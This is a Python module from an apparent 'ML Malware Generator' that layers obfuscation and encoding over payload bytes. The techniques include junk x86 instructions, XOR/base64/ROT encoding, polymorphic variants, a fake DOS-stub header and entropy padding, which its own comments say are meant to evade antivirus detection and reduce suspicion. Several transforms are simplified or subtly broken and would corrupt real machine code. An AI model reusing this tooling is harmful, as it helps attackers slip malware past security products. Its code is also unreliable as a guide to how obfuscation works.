"""
ML Malware Generator - Obfuscation System
Multi-layer obfuscation for payloads
"""
import random
import string
from typing import Tuple, List, Dict, Optional
import hashlib

from utils.crypto import get_crypto
from utils.logger import get_logger

logger = get_logger()
crypto = get_crypto()


class Obfuscator:
    """Multi-layer obfuscation system"""
    
    def __init__(self):
        self.obfuscation_techniques = [
            "code_obfuscation",
            "string_encryption",
            "api_hashing",
            "control_flow_flattening",
            "dead_code_insertion",
            "variable_renaming",
            "metamorphic_transform",
            "instruction_substitution",
            "opaque_predicates",
            "junk_code_generation",
        ]
    
    def obfuscate_payload(
        self,
        payload: bytes,
        level: int = 3,
        techniques: Optional[List[str]] = None,
    ) -> Tuple[bytes, Dict]:
        """
        Apply multi-layer obfuscation to payload
        
        Args:
            payload: Original payload bytes
            level: Obfuscation level (1-5)
            techniques: Specific techniques to apply (None = auto-select)
        
        Returns:
            (obfuscated_payload, metadata)
        """
        logger.info(f"Obfuscating payload (level={level})")
        
        obfuscated = payload
        metadata = {
            "original_size": len(payload),
            "obfuscation_level": level,
            "techniques_applied": [],
        }
        
        # Select techniques based on level
        if techniques is None:
            num_techniques = min(level, len(self.obfuscation_techniques))
            techniques = random.sample(self.obfuscation_techniques, num_techniques)
        
        # Apply each technique
        for technique in techniques:
            if technique == "code_obfuscation":
                obfuscated = self._code_obfuscation(obfuscated)
            elif technique == "string_encryption":
                obfuscated = self._string_encryption(obfuscated)
            elif technique == "api_hashing":
                obfuscated = self._api_hashing(obfuscated)
            elif technique == "control_flow_flattening":
                obfuscated = self._control_flow_flattening(obfuscated)
            elif technique == "dead_code_insertion":
                obfuscated = self._dead_code_insertion(obfuscated)
            elif technique == "variable_renaming":
                obfuscated = self._variable_renaming(obfuscated)
            elif technique == "metamorphic_transform":
                obfuscated = self._metamorphic_transform(obfuscated)
            elif technique == "instruction_substitution":
                obfuscated = self._instruction_substitution(obfuscated)
            elif technique == "opaque_predicates":
                obfuscated = self._opaque_predicates(obfuscated)
            elif technique == "junk_code_generation":
                obfuscated = self._junk_code_generation(obfuscated)
            
            metadata["techniques_applied"].append(technique)
            logger.debug(f"Applied {technique}")
        
        metadata["final_size"] = len(obfuscated)
        metadata["size_increase"] = len(obfuscated) - len(payload)
        
        logger.success(f"Obfuscation complete ({len(techniques)} techniques applied)")
        return obfuscated, metadata
    
    def _code_obfuscation(self, payload: bytes) -> bytes:
        """Apply code-level obfuscation"""
        # Insert junk instructions (NOP equivalents)
        obfuscated = bytearray()
        
        for i, byte in enumerate(payload):
            obfuscated.append(byte)
            
            # Randomly insert junk bytes
            if random.random() < 0.1:  # 10% chance
                # Insert equivalent NOP instructions
                junk = random.choice([
                    b'\x90',  # NOP
                    b'\x66\x90',  # 2-byte NOP
                    b'\x0f\x1f\x00',  # 3-byte NOP
                ])
                obfuscated.extend(junk)
        
        return bytes(obfuscated)
    
    def _string_encryption(self, payload: bytes) -> bytes:
        """Encrypt strings in payload"""
        # Generate random key
        key = crypto.generate_key(16)
        
        # XOR encrypt payload
        encrypted = crypto.xor_encrypt(payload, key)
        
        # Prepend key (in real implementation, key would be embedded differently)
        return key + encrypted
    
    def _api_hashing(self, payload: bytes) -> bytes:
        """Apply API hashing obfuscation"""
        # Simulate API hashing by adding hash values
        # In real implementation, this would replace API names with hashes
        
        api_hash = hashlib.sha256(b"GetProcAddress").digest()[:8]
        
        return api_hash + payload
    
    def _control_flow_flattening(self, payload: bytes) -> bytes:
        """Flatten control flow"""
        # Simplified: just add some control flow obfuscation markers
        header = b'\xEB\x00'  # JMP +0 (no-op jump)
        return header + payload
    
    def _dead_code_insertion(self, payload: bytes) -> bytes:
        """Insert dead code"""
        # Insert unreachable code blocks
        dead_code = b'\xEB\x05'  # JMP +5 (skip next 5 bytes)
        dead_code += b'\x90' * 5  # Dead code that will be skipped
        
        # Insert at random position
        insert_pos = len(payload) // 2
        return payload[:insert_pos] + dead_code + payload[insert_pos:]
    
    def _variable_renaming(self, payload: bytes) -> bytes:
        """Rename variables (simplified for binary)"""
        # For binary payloads, this is limited
        # Just add some obfuscation markers
        return b'VAR_' + payload
    
    def apply_polymorphic_obfuscation(
        self,
        payload: bytes,
        num_variants: int = 5,
    ) -> List[Tuple[bytes, Dict]]:
        """
        Generate multiple polymorphic variants
        
        Args:
            payload: Original payload
            num_variants: Number of variants to generate
        
        Returns:
            List of (variant_payload, metadata) tuples
        """
        logger.info(f"Generating {num_variants} polymorphic variants")
        
        variants = []
        
        for i in range(num_variants):
            # Use different random seed for each variant
            random.seed(i)
            
            # Apply random techniques
            level = random.randint(2, 5)
            obfuscated, metadata = self.obfuscate_payload(payload, level=level)
            
            # Add polymorphic encoding
            encoded, poly_metadata = crypto.polymorphic_encode(obfuscated, seed=i)
            
            metadata["polymorphic_seed"] = i
            metadata["polymorphic_encoding"] = poly_metadata
            
            variants.append((encoded, metadata))
        
        logger.success(f"Generated {len(variants)} polymorphic variants")
        return variants
    
    def reduce_entropy(self, payload: bytes) -> bytes:
        """
        Reduce entropy to avoid detection
        (High entropy is suspicious for AV)
        """
        # Pad with low-entropy data
        padding_size = len(payload) // 4
        padding = b'\x00' * padding_size
        
        return payload + padding
    
    def add_legitimate_code(self, payload: bytes) -> bytes:
        """Add legitimate-looking code to reduce suspicion"""
        # Add benign-looking header
        benign_header = b'This program cannot be run in DOS mode.\r\n'
        
        return benign_header + payload
    
    def _metamorphic_transform(self, payload: bytes) -> bytes:
        """Apply metamorphic transformations"""
        # Transform code structure while preserving functionality
        transformed = bytearray()
        
        # Chunk the payload
        chunk_size = 16
        chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
        
        # Randomly reorder chunks with jump instructions
        indices = list(range(len(chunks)))
        random.shuffle(indices)
        
        # Build transformed payload with jumps
        for i, idx in enumerate(indices):
            transformed.extend(chunks[idx])
            
            # Add jump to next chunk (simplified)
            if i < len(indices) - 1:
                # JMP instruction (simplified)
                transformed.extend(b'\xEB\x00')  # JMP +0 (placeholder)
        
        return bytes(transformed)
    
    def _instruction_substitution(self, payload: bytes) -> bytes:
        """Substitute instructions with equivalent sequences"""
        substituted = bytearray()
        
        i = 0
        while i < len(payload):
            byte = payload[i]
            
            # Substitute common instructions
            if byte == 0x90:  # NOP
                # Replace NOP with equivalent multi-byte NOP
                substitutions = [
                    b'\x66\x90',  # 2-byte NOP
                    b'\x0f\x1f\x00',  # 3-byte NOP
                    b'\x0f\x1f\x40\x00',  # 4-byte NOP
                ]
                substituted.extend(random.choice(substitutions))
            elif byte == 0x40:  # INC EAX
                # Replace with ADD EAX, 1
                substituted.extend(b'\x83\xC0\x01')
            elif byte == 0x48:  # DEC EAX
                # Replace with SUB EAX, 1
                substituted.extend(b'\x83\xE8\x01')
            else:
                substituted.append(byte)
            
            i += 1
        
        return bytes(substituted)
    
    def _opaque_predicates(self, payload: bytes) -> bytes:
        """Insert opaque predicates for confusing analysis"""
        obfuscated = bytearray()
        
        # Insert at random positions
        insert_positions = sorted(random.sample(
            range(len(payload)), 
            min(5, len(payload) // 20)
        ))
        
        last_pos = 0
        for pos in insert_positions:
            obfuscated.extend(payload[last_pos:pos])
            
            # Insert opaque predicate (always true/false)
            # Example: if (x*x >= 0) which is always true
            opaque = b'\x31\xC0'  # XOR EAX, EAX
            opaque += b'\x85\xC0'  # TEST EAX, EAX
            opaque += b'\x74\x00'  # JZ +0 (always taken)
            
            obfuscated.extend(opaque)
            last_pos = pos
        
        obfuscated.extend(payload[last_pos:])
        return bytes(obfuscated)
    
    def _junk_code_generation(self, payload: bytes) -> bytes:
        """Generate realistic-looking junk code"""
        junk_templates = [
            b'\x50\x58',  # PUSH EAX; POP EAX
            b'\x51\x59',  # PUSH ECX; POP ECX
            b'\x89\xC0',  # MOV EAX, EAX
            b'\x31\xC0\x31\xC0',  # XOR EAX, EAX; XOR EAX, EAX
            b'\x40\x48',  # INC EAX; DEC EAX
        ]
        
        obfuscated = bytearray()
        
        for byte in payload:
            obfuscated.append(byte)
            
            # Randomly insert junk code
            if random.random() < 0.05:  # 5% chance
                junk = random.choice(junk_templates)
                obfuscated.extend(junk)
        
        return bytes(obfuscated)


class Encoder:
    """Encoding system for payloads"""
    
    def __init__(self):
        self.encoders = {
            "base64": crypto.base64_encode,
            "hex": crypto.hex_encode,
            "xor": self._xor_encode,
            "rot": self._rot_encode,
            "custom_ml": self._ml_encode,
        }
    
    def encode(
        self,
        payload: bytes,
        encoder: str = "base64",
        iterations: int = 1,
    ) -> Tuple[bytes, Dict]:
        """
        Encode payload with specified encoder
        
        Args:
            payload: Payload to encode
            encoder: Encoder type
            iterations: Number of encoding iterations
        
        Returns:
            (encoded_payload, metadata)
        """
        logger.info(f"Encoding payload with {encoder} ({iterations} iterations)")
        
        encoded = payload
        metadata = {
            "encoder": encoder,
            "iterations": iterations,
            "original_size": len(payload),
        }
        
        for i in range(iterations):
            if encoder == "base64":
                encoded = crypto.base64_encode(encoded).encode('utf-8')
            elif encoder == "hex":
                encoded = crypto.hex_encode(encoded).encode('utf-8')
            elif encoder == "xor":
                encoded = self._xor_encode(encoded)
            elif encoder == "rot":
                encoded = self._rot_encode(encoded)
            elif encoder == "custom_ml":
                encoded = self._ml_encode(encoded)
            else:
                raise ValueError(f"Unknown encoder: {encoder}")
        
        metadata["final_size"] = len(encoded)
        
        logger.success(f"Encoding complete")
        return encoded, metadata
    
    def _xor_encode(self, data: bytes) -> bytes:
        """XOR encoding with random key"""
        key = crypto.generate_key(16)
        encoded = crypto.xor_encrypt(data, key)
        return key + encoded  # Prepend key
    
    def _rot_encode(self, data: bytes) -> bytes:
        """ROT encoding"""
        shift = random.randint(1, 255)
        encoded = crypto.rot_encode(data, shift)
        return bytes([shift]) + encoded  # Prepend shift value
    
    def _ml_encode(self, data: bytes) -> bytes:
        """ML-based custom encoding"""
        # Use polymorphic encoding
        encoded, metadata = crypto.polymorphic_encode(data)
        
        # Prepend seed for decoding
        seed_bytes = metadata["seed"].to_bytes(4, 'big')
        return seed_bytes + encoded
    
    def multi_layer_encode(
        self,
        payload: bytes,
        encoders: List[str] = None,
    ) -> Tuple[bytes, List[Dict]]:
        """
        Apply multiple layers of encoding
        
        Args:
            payload: Payload to encode
            encoders: List of encoders to apply in order
        
        Returns:
            (encoded_payload, list of metadata for each layer)
        """
        if encoders is None:
            encoders = ["xor", "base64", "rot"]
        
        logger.info(f"Applying {len(encoders)}-layer encoding")
        
        encoded = payload
        metadata_list = []
        
        for encoder in encoders:
            encoded, metadata = self.encode(encoded, encoder, iterations=1)
            metadata_list.append(metadata)
        
        logger.success(f"Multi-layer encoding complete ({len(encoders)} layers)")
        return encoded, metadata_list


# Global instances
_obfuscator = None
_encoder = None


def get_obfuscator() -> Obfuscator:
    """Get global obfuscator instance"""
    global _obfuscator
    if _obfuscator is None:
        _obfuscator = Obfuscator()
    return _obfuscator


def get_encoder() -> Encoder:
    """Get global encoder instance"""
    global _encoder
    if _encoder is None:
        _encoder = Encoder()
    return _encoder
